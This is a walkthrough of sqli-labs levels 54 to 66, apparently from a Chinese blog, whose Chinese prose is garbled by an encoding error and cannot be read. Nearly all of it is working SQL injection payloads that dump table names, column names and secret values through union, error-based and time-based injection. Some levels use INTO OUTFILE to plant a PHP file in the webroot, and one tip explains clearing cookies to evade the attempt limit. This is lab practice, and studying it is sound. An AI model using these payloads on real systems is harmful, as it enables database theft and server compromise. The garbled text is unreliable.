10å‘½é€šå…³å—ï¼Œæœ‰ç‚¹æ„æ€

æˆ–è®¸ä¹Ÿå¯ä»¥é€šè¿‡ä½¿ç”¨ä»£ç†ã€åˆ‡æ¢æµè§ˆå™¨ã€æ¸…æ¥šcookieç­‰æ–¹å¼ç»•è¿‡æœåŠ¡å™¨çš„æ¬¡æ•°é™åˆ¶ï¼Œè¿™é‡Œå¥½åƒæ˜¯æ ¹æ®cookieè®°å½•çš„ï¼Œæ¬¡æ•°å¿«åˆ°äº†æ¸…æ¥šcookieåˆ·æ–°é¡µé¢

æµ‹è¯•åå°é—­åˆæ–¹å¼

```sql
?id=0'or 1=1%23
```

![104](/medias/sqli-labs/104.png)

2ï¼Œ3ä¸ºå›æ˜¾ä½

![105](/medias/sqli-labs/105.png)


ä¸¤ä¸ªå›æ˜¾ä½ï¼Œå¹²è„†ä¸€æ¬¡çˆ†è¡¨ã€çˆ†å­—æ®µ

```sql
?id=0'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database())%23
```

![106](/medias/sqli-labs/106.png)


çˆ†æ•°æ®

```sql
?id=0'union select 1,2,(select group_concat(id,'-----',sessid,'-----',secret_3182,'-----',tryy) from B77BC4ZQI3)%23
```

![107](/medias/sqli-labs/107.png)


## Less-55

æµ‹è¯•åå°é—­åˆæ–¹å¼

```sql
?id=0) or 1=1%23
```

![108](/medias/sqli-labs/108.png)

çˆ†è¡¨ã€çˆ†å­—æ®µ

```sql
?id=0) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database())%23
```

![109](/medias/sqli-labs/109.png)

çˆ†æ•°æ®

```sql
?id=0) union select 1,2,(select group_concat(id,'-----',sessid,'-----',secret_3182,'-----',tryy) from B77BC4ZQI3)%23
```

![110](/medias/sqli-labs/110.png)


## Less-56

æµ‹è¯•åå°é—­åˆæ–¹å¼

```sql
?id=0') or 1=1%23
```

![111](/medias/sqli-labs/111.png)


çˆ†è¡¨ã€çˆ†å­—æ®µ

```sql
?id=0') union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database())%23
```

![112](/medias/sqli-labs/112.png)

çˆ†æ•°æ®

```sql
?id=0') union select 1,2,(select group_concat(id,'-----',sessid,'-----',secret_8N8A,'-----',tryy) from 07Z057A61B)%23
```

![113](/medias/sqli-labs/113.png)


## Less-57

æµ‹è¯•åå°é—­åˆæ–¹å¼ï¼ŒåŒå¼•å·ç±»å‹ æµ‹äº†11æ¬¡

```sql
?id=0" or 1=1%23
```

![114](/medias/sqli-labs/114.png)

çˆ†è¡¨ã€çˆ†å­—æ®µ

```sql
?id=0" union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database())%23
```

![115](/medias/sqli-labs/115.png)

çˆ†æ•°æ®

```sql
?id=0" union select 1,2,(select group_concat(id,'-----',sessid,'-----',secret_W1BG,'-----',tryy) from RGQEZ8TA8R)%23
```

![116](/medias/sqli-labs/116.png)


## Less-58

æµ‹è¯•åå°é—­åˆæ–¹å¼

```sql
?id=0' or 1=1%23
```

![117](/medias/sqli-labs/117.png)


è”åˆæŸ¥è¯¢æ²¡æœ‰å›æ˜¾ï¼Œä½†æ˜¯æµ‹è¯•è¿‡ç¨‹æœ‰æŠ¥é”™ï¼ŒæŠ¥é”™æ³¨å…¥

çˆ†è¡¨ã€å­—æ®µ

```sql
# è¡¨å 1I2IZXOTD3
?id=0' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23
```

```sql
# å­—æ®µå id,sessid,secret_4FE6,tryy
?id=0' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database()),0x7e),1)%23
```

![118](/medias/sqli-labs/118.png)


çˆ†æ•°æ®

```sql
?id=0' or updatexml(1,concat(0x7e,(select group_concat(secret_4FE6) from 1I2IZXOTD3),0x7e),1)%23
```

![119](/medias/sqli-labs/119.png)

## Less-59

æµ‹è¯•åå°é—­åˆæ–¹å¼

```sql
?id=0 or 1=1%23
```

![120](/medias/sqli-labs/120.png)

çˆ†è¡¨ã€å­—æ®µ

```sql
# è¡¨å K7RBPJ7JI6
?id=0 or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))%23
```

```sql
# å­—æ®µ id,sessid,secret_9FTK,tryy
?id=0 or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database()),0x7e))%23
```

çˆ†æ•°æ®

```sql
?id=0 or extractvalue(1,concat(0x7e,(select group_concat(secret_9FTK) from K7RBPJ7JI6),0x7e))%23
```


## Less-60

æµ‹è¯•åå°é—­åˆæ–¹å¼

```sql
?id=0") or 1=1%23
```

çˆ†è¡¨ã€å­—æ®µ

```sql
# è¡¨å FJ6S67618K
?id=0") or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))%23
```

```sql
# å­—æ®µ id,sessid,secret_BG4H,tryy
?id=0") or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database()),0x7e))%23
```

çˆ†æ•°æ®

```sql
?id=0") or extractvalue(1,concat(0x7e,(select group_concat(secret_BG4H) from FJ6S67618K),0x7e))%23
```


## Less-61

æµ‹è¯•åå°é—­åˆæ–¹å¼

```sql
?id=0')) or 1=1%23
```

çˆ†è¡¨ã€å­—æ®µ

```sql
# è¡¨å 7L3F6QOYU6
?id=0')) or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))%23
```

```sql
# å­—æ®µ id,sessid,secret_RLGQ,tryy
?id=0')) or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database()),0x7e))%23
```

çˆ†æ•°æ®

```sql
?id=0')) or extractvalue(1,concat(0x7e,(select group_concat(secret_RLGQ) from 7L3F6QOYU6),0x7e))%23
```


## Less-62

ä¸ºä»€ä¹ˆç»™äº†130æ¬¡æœºä¼š ğŸ¤¯


æµ‹å‡ºåå°é—­åˆæ–¹å¼

```sql
?id=0') or if(1=1,sleep(5),sleep(5))%23
```

æ—¶é—´ç›²æ³¨ï¼Ÿ130æ¬¡æ—¶é—´ç›²æ³¨å°±æ˜¯ç”¨äºŒåˆ†æ³•ä¼˜åŒ–ä¹Ÿä¸å¤Ÿç”¨å§ ğŸ¤¯


è¯•è¯•èƒ½ä¸èƒ½å†™ä¸ªé©¬å­è¿›å»

```sql
?id=0') union select 1,2,'<?=phpinfo();?>' into outfile'/var/www/html/Less-62/1.php'%23
```

æˆåŠŸ

![121](/medias/sqli-labs/121.png)


## Less-63

æµ‹è¯•åå°é—­åˆæ–¹å¼

```sql
?id=0' or 1=1%23
```

å†™ä¸ªé©¬å­

```sql
?id=0' union select 1,2,'<?=phpinfo();?>' into outfile'/var/www/html/Less-63/1.php'%23
```

æˆåŠŸ

![122](/medias/sqli-labs/122.png)

## Less-64

æµ‹è¯•åå°é—­åˆæ–¹å¼

```sql
?id=0)) or 1=1%23
```

è¿™å›ä¸å†™é©¬å­äº†ï¼ŒæŠŠæŸ¥è¯¢ç»“æœå†™åˆ°æ–‡ä»¶é‡Œ

çˆ†è¡¨ã€å­—æ®µ

```sql
# è¡¨å 7L3F6QOYU6 
# å­—æ®µ secret_RLGQ
?id=0)) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database()) into outfile '/var/www/html/Less-64/1.php'%23
```

çˆ†æ•°æ®

```sql
?id=0)) union select 1,2,(select group_concat(secret_RLGQ) from 7L3F6QOYU6) into outfile '/var/www/html/Less-64/2.php'%23
```

æˆåŠŸ

![123](/medias/sqli-labs/123.png)


## Less-65

æµ‹è¯•åå°é—­åˆæ–¹å¼

```sql
?id=0") or 1=1%23
```

çˆ†è¡¨ã€å­—æ®µ

```sql
# è¡¨å 7L3F6QOYU6  
# å­—æ®µ secret_RLGQ
?id=0") union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database()) into outfile '/var/www/html/Less-65/1.php'%23
```

çˆ†æ•°æ®

```sql
?id=0") union select 1,2,(select group_concat(secret_RLGQ) from 7L3F6QOYU6) into outfile '/var/www/html/Less-65/2.php'%23
```

æˆåŠŸ

![124](/medias/sqli-labs/124.png)

~~æˆ‘æµ‹ï¼Œé¬¼æ‰“å¢™äº†ï¼Œè¿™ä¸¤å…³è¡¨åã€å­—æ®µã€æ•°æ®ä¸€æ ·ï¼Ÿ~~


## Less-66

æˆ‘çš„Less-66å“ªå»äº†

![125](/medias/sqli-labs/125.png)


## æœ€å

å¥½åƒåšå®Œäº†ï¼Ÿå–µäº†ä¸ªå’ªçš„ï¼Œè¿™ä¸ªé¶åœºè´¨é‡å¤ªé«˜äº†ï¼Œæ„Ÿè°¢å¤§ä½¬ä»¬çš„åˆ†æä»¥åŠæ€»ç»“ï¼Œç‡ƒå°½äº†


å‚è€ƒã€è‡´è°¢ï¼š


- [mysqlæ³¨å…¥å¤©ä¹¦](https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf)
- [sqli-labs é¶åœº 1-65 é€šå…³è®°](https://tari.moe/2022/sqli-labs)
- [Audi-1/sqli-labs](https://github.com/Audi-1/sqli-labs/tree/master)

